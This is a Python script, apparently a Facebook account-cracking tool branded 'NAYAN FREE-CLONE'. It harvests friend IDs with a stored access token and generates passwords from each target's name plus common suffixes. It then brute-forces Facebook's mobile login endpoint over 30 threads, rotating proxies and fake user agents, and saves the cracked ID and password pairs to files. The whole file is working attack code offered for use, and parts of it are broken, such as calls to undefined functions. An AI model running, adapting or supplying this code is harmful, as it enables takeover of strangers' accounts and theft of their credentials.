 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
	#os.system('git clone https://github.com/Hannan-404/FILE')
except Exception as e:
	print('[\x1b[38;5;46mâ€¢\x1b[1;97m] [\x1b[\x1b[38;5;46mTEAM-NAYAN\x1b[1;97m]\x1b[1;91m')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 2.2; en-us; GT-I9000 Build/MASTER) '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
 
 
	aa='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
try:
    url_proxy = random.choice([
              "https://github.com/N41M01/PUBLIC/blob/main/DEVIL.txt",
])
except:pass
 
 
def uaku():
	try:
		ua=open('Aprl.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/N41M01/PUBLIC/blob/main/DEVIL.txt').text
		ua=open('.Aprl.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.Aprl.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
RR ='\x1b[38;5;46m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def DEVILj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
#------------------[ MAIN  MENU ]-----------------#
 
 
 
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔══════════════════════════════════════════════╗
\033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
\033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
\033[0;32m║ ██ ██  ██ \033[0;31m███████   \033[0;93m████   \033[0;32m███████ \033[0;31m██ ██  ██\033[0;92m ║
\033[0;32m║ ██  ██ ██ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██  ██ ██\033[0;92m ║
\033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
\033[0;92m╚══════════════════════════════════════════════╝
\033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    FREE-CLONE         ║\033[0;92m║ 😘║
\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝""")
 
 
 
   
 
 

def menu():
	os.system('clear')
	banner()
	DEVILj(f'----------------------------------------------------------------------------')
	print(f"\x1b[38;5;46m ~~~>[~NAYAN~][~MEMU~]<~~~ ")
	print('\033[92m[\033[37m1\033[92m]\x1b[38;5;46m Public Cloning')
	print('\033[92m[\033[37m2\033[92m]\x1b[38;5;46m File Cloning')
	print('\033[92m[\033[37m3\033[92m]\x1b[38;5;46m Contact with Admin')
	print('\033[92m[\033[37m0\033[92m]\x1b[38;5;46m LOG OUT')
	DEVILj(f'----------------------------------------------------------------------------')
	DEVIL= input('\x1b[38;5;46m [~CHOOSE~]  :>');time.sleep(0.01)
	if DEVIL in ['1']:
		public()
	elif DEVIL in ['2']:
		crack_file()
	elif DEVIL in ['3','03']:
		os.system()
	elif DEVIL in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('\x1b[38;5;46m LOGOUT SUCCESSFUL ')
		exit()
	else:
		print(' SELECT YOUR RIGHT OPTION ')
		back()
def error():
	print(f'{k} TRY AGAIN {u}')
	time.sleep(4)
	back()
	

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m ENTER THE NUMBERS OF IDZ :>\x1b[38;5;46m   '))
	except ValueError:
		print(' INVALID OPTION ')
		back()
	if jum<1 or jum>100000000:
		print('TRY AGAIN ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('INPUT YOUR ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('TRY AGAIN ')
			os.system('clear')
	try:
		print(f' TOTAL ID: {RR}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'TRY AGAIN WITH NEW COOKIE')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	DEVILj(f'----------------------------------------------------------------------------')
	print('\033[0;31mEXAMPLE : > \x1b[38;5;46m /sdcard/nayan.txt ')
	DEVILj(f'----------------------------------------------------------------------------')
	o = input('FILE LOCATION :> \x1b[38;5;46m ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found...Try Agine')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	DEVILj(f'----------------------------------------------------------------------------')
	print('\x1b[38;5;196mNAYAN LOGIN METHOD')
	print('\x1b[38;5;196m [1] M1')
	print('\x1b[38;5;196m [2] M2')
	DEVILj(f'----------------------------------------------------------------------------')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()
 
def passwrd():
	os.system('clear')
	banner()
	DEVILj(f'')
	print(f"\033[92m[\033[37m*\033[92m]\033[37m \033[1;32mNAYAN Premium Mood Activated ")
	print(f"\033[92m[\033[37m*\033[92m]\033[37mTool Name:\033[1;92m File")
	print("\033[92m[\033[37m*\033[92m]\033[37mUSE MOBILE DATA\033[1;37m")
	print('\033[92m[\033[37m*\033[92m]\033[37mTOTAL IDz : '+str(len(id)))
	print('\033[92m[\033[37m*\033[92m]\033[37mThe process has been started')
	print('\033[92m[\033[37m*\033[92m]\033[37m \033[1;93m NOTE : Fast Airplane Mode [On/Off] Be For Use ')
	DEVILj(f'')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'786')
					pwv.append(nmf+'@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					
					
				pool.submit(crack,idf,pwv)
	print('')
	DEVILj('-----------------------------------------------')
	DEVILj('CHACKING COMPLETE .......... ')
	print(f'{h}[{h}{h}]{h} OK : {h}%s '%(ok))
	input('CLICK ENTER TO MAIN MENU ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rNAYAN{P}{loop}{P}+{P}{len(id)}{P} OK{P}={H}{ok}{P} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r1b[38;5;196m [cp] {idf} | {pw} {N}')     
				open('/sdcard/NAYAN/CP/'+cpc,'a').write(idf+' | '+pw+'\n')
				akun.append(idf+' | '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'{H}[NAYAN] {H}{idf} | {H}{pw}')
				open('/sdcard/nayan/OK/'+okc,'a').write(idf+' | '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()
	
 
